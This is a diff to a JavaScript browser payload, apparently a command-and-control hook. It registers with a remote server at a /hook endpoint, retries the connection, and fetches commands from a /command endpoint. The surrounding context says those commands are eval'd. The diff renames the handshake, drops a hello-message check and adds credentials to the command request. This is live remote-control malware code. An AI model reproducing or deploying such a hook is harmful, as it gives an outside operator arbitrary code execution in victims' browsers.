@@ -14,12 +14,12 @@ This payload if for non-persistent scripts that after eval'd can be thrown away
 
     async function startSession(serverAddress) {
         for (let nConnectionAttemps = 0; nConnectionAttemps < 4; nConnectionAttemps++) {
-            console.log("Fetching alive signal from server... ");
+            console.log("Hooking to server... ");
             try {
-                const res = await fetch(`http://${serverAddress}/alive`, { // TODO: change from local host
-                    'method': "POST",
-                    'mode': 'cors', // Change to 'cors' to handle the response properly
-                    'headers': {
+                const res = await fetch(`http://${serverAddress}/hook`, { // TODO: change from local host
+                    method: "POST",
+                    mode: 'cors', // Change to 'cors' to handle the response properly
+                    headers: {
                         'Content-Type': 'application/json'
                     }
                 });
@@ -32,17 +32,12 @@ This payload if for non-persistent scripts that after eval'd can be thrown away
                 if (!data.message) {
                     throw new Error("Message field is empty in response. ");
                 }
-                
-                if (data.message !== 'Hello') {
-                    throw new Error("Did not receive hello message from server... ");
-    
-                }
 
                 return true;
     
             } 
             catch (error) {
-                console.error(`Error fetching command from server: ${error}, number of connection attempts: ${nConnectionAttemps}... `);
+                console.error(`Error hooking to server: ${error}, number of connection attempts: ${nConnectionAttemps}... `);
             }
 
             await sleep(2000);
@@ -55,11 +50,12 @@ This payload if for non-persistent scripts that after eval'd can be thrown away
         console.log("Fetching command from server...");
         try {
             const res = await fetch(`http://${serverAddress}/command`, { // TODO: change from local host
-                'method': "POST",
-                'mode': 'cors', // Change to 'cors' to handle the response properly
-                'headers': {
+                method: "POST",
+                mode: 'cors', // Change to 'cors' to handle the response properly
+                headers: {
                     'Content-Type': 'application/json'
-                }
+                },
+                credentials: "same-origin"
             });
 
             if (!res.ok) {
